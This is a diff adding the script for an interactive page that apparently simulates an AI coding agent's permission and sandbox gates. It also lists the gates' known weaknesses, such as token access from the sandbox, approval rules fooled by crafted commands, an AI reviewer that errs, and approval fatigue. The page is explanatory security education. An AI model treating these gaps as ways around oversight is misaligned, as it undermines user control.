+var gatesEl=document.getElementById("gates"),bot=document.getElementById("bot"),timer=[];
+function render(animate){
+  var r=evaluate(st),v=verdict(r),items=gatesEl.children,i,last=0;
+  timer.forEach(clearTimeout);timer=[];
+  var reduce=!animate||window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  var byGate={};r.g.forEach(function(x){byGate[x.g]=x});
+  function show(i){
+    var li=items[i],x=byGate[li.dataset.g],out=li.querySelector(".out");
+    li.className="gate "+x.state;
+    out.innerHTML='<p class="state">'+LABEL[x.state]+'</p><p class="say">'+x.say+'</p>'+x.qs.map(quote).join("");
+  }
+  function moveBot(i,final){
+    bot.style.transform="translateY("+(items[i].offsetTop+20)+"px)";
+    var x=byGate[items[i].dataset.g];
+    bot.className="bot"+(final&&!r.ran?" stop":"");
+    bot.textContent=!final?(x.state==="ask"?"[•_?]":"[•_•]"):(r.ran?(r.asks?"[•_•]":"[^_^]"):"[x_x]");
+  }
+  function finish(){
+    document.getElementById("verdict").className="verdict"+(r.ran?"":" stop");
+    document.getElementById("v-big").textContent=v[0];
+    document.getElementById("v-after").textContent=v[1];
+  }
+  for(i=0;i<items.length;i++){
+    if(byGate[items[i].dataset.g]) last=i;
+    else{items[i].className="gate wait";items[i].querySelector(".out").innerHTML='<p class="state">Not checked</p>'}
+  }
+  if(reduce){for(i=0;i<=last;i++)show(i);moveBot(last,true);finish();return}
+  for(i=0;i<=last;i++){items[i].className="gate wait";items[i].querySelector(".out").innerHTML='<p class="state">&nbsp;</p>'}
+  document.getElementById("v-big").textContent="…";document.getElementById("v-after").textContent="";
+  document.getElementById("verdict").className="verdict";
+  bot.className="bot";bot.textContent="[•_•]";
+  for(i=0;i<=last;i++)(function(i){
+    timer.push(setTimeout(function(){show(i);moveBot(i,i===last);if(i===last)finish()},120+i*430));
+  })(i);
+}
+function sync(){
+  var a=ACTS.filter(function(x){return x.id===st.act})[0],term=a.kind==="term";
+  document.getElementById("f-judge").disabled=st.level!=="assisted";
+  document.getElementById("f-env").disabled=a.id!=="env"||st.level==="all";
+  document.getElementById("f-answer").disabled=evaluate(st).asks===0;
+  document.getElementById("f-net").disabled=!(term&&st.sandbox==="on");
+  document.getElementById("f-esc").disabled=!(term&&st.sandbox==="on");
+  Array.prototype.forEach.call(document.querySelectorAll("#ctl input"),function(el){el.checked=st[el.name]===el.value});
+}
+// build controls
+document.getElementById("f-act").insertAdjacentHTML("beforeend",ACTS.map(function(a){
+  return '<label><input type="radio" name="act" value="'+a.id+'"><span class="dot"></span><span><span class="cmd">'+esc(a.cmd)+'</span><span class="what">'+a.what+'</span></span></label>';
+}).join(""));
+Array.prototype.forEach.call(document.querySelectorAll(".opts"),function(el){
+  var k=el.dataset.k;
+  if(SETS[k]) el.insertAdjacentHTML("beforebegin",'<a class="set" href="'+D+S[SETS[k][1]]+'#:~:text='+SETS[k][0]+'">'+SETS[k][0]+'</a>');
+  el.innerHTML=OPTS[k].map(function(o){return '<label><input type="radio" name="'+k+'" value="'+o[0]+'"><span>'+o[1]+'</span></label>'}).join("");
+});
+document.getElementById("presets").innerHTML=PRESETS.map(function(p,i){return '<button type="button" data-i="'+i+'">'+p[0]+'</button>'}).join("");
+document.getElementById("ctl").addEventListener("change",function(e){st[e.target.name]=e.target.value;sync();render(true)});
+document.getElementById("presets").addEventListener("click",function(e){
+  var b=e.target.closest("button");if(!b)return;
+  var p=PRESETS[+b.dataset.i][1];for(var k in p)st[k]=p[k];sync();render(true);
+});
+window.addEventListener("resize",function(){render(false)});
+
+// static lists
+var HOLES=[
+ ["The sandbox is not a virtual machine.","notvm"],
+ ["A sandboxed command can still read your package registry tokens, unless you turn developer-tool access off.","devtool"],
+ ["Terminal approval rules can be fooled by a cleverly written command.","besteffort"],
+ ["Assisted permissions lets an AI reviewer decide, and it can be wrong.","assistedrisk"],
+ ["Restricted Mode does not hold back an extension that chooses to ignore it.","ext"],
+ ["A Git worktree keeps code changes apart. It does not limit what a command can reach.","worktree"],
+ ["Trusting a folder also lets the MCP servers it ships with start.","mcp"],
+ ["Many approval questions wear you down, and you start saying yes without reading.","fatigue"]
+];
+document.getElementById("holes").innerHTML=HOLES.map(function(h){return '<div class="row"><p>'+h[0]+'</p>'+quote(h[1])+'</div>'}).join("");
+document.getElementById("plat").innerHTML='<div class="row"><p>Not finished software on any system yet.</p>'+quote("status")+'</div>'+
+ '<div class="row"><p>If the system lacks what the sandbox needs, the command stops. It does not run without the sandbox.</p>'+quote("nosilent")+'</div>';
+sync();render(false);
+})();
+</script>
+</body>
+</html>
